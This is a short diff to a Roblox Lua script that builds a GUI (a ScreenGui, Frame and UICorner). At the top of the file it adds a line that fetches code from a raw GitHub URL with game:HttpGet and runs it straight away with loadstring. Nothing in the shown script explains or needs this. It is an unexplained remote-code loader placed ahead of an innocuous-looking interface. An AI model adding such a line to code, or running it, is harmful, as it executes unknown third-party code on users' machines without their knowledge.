@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VBallsYCUKER/gui/refs/heads/main/wh", true))()
+
 local screenGui = Instance.new("ScreenGui")
 local mainFrame = Instance.new("Frame")
 local uiCorner = Instance.new("UICorner")
